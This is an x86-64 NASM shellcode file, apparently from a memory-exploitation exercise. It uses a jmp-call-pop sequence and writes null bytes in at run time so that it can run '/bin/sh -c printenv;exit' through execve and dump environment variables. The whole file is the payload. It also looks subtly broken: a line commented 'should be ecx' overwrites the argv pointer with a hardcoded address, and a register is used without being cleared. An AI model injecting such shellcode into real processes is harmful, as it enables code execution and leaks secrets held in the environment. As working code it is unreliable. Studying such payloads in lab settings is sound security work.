          bits 64
          ; find out where we are
start:    jmp short codeEnd
start2:   pop rsi

          ; clear the A register
          xor rax, rax    

          ; restore null bytes to data
          mov [rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh
          mov [rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
          mov [rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
          mov [rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array

          ; calculate runtime address of each label and store it in the array
          mov [rsi + arrayAddr - exeStr], rsi
          lea rdi, [byte rsi + flagStr - exeStr]
          mov [rsi + arrayAddr - exeStr + 8], rdi
          lea rdi, [byte rsi + cmdStr - exeStr]
          mov [rsi + arrayAddr - exeStr + 16], rdi
          
          ; execve system call
          mov al, 0x3b
          mov rdi, rsi
          lea rsi, [rsi + arrayAddr - exeStr]
          mov rdx, rsp
          shr rdx, 32
          shl rdx, 32
          mov rsi, 0xf7fbe6ff ; should be ecx
          xor cl, cl
          or rdx, rcx
          mov rdx,[rdx]
          syscall

          ; exit system call
          mov rdi,rax
          xor rax,rax
          mov al,0x3C
          syscall

codeEnd:  call start2
          ; data
exeStr:   db "/bin/shXy"
flagStr:  db "-cX"
cmdStr:   db "printenv;exitX"
arrayAddr:dq 0xffffffffffffffff
          dq 0xffffffffffffffff
          dq 0xffffffffffffffff
          dq 0xffffffffffffffff
newAddr:  dd newAddr-start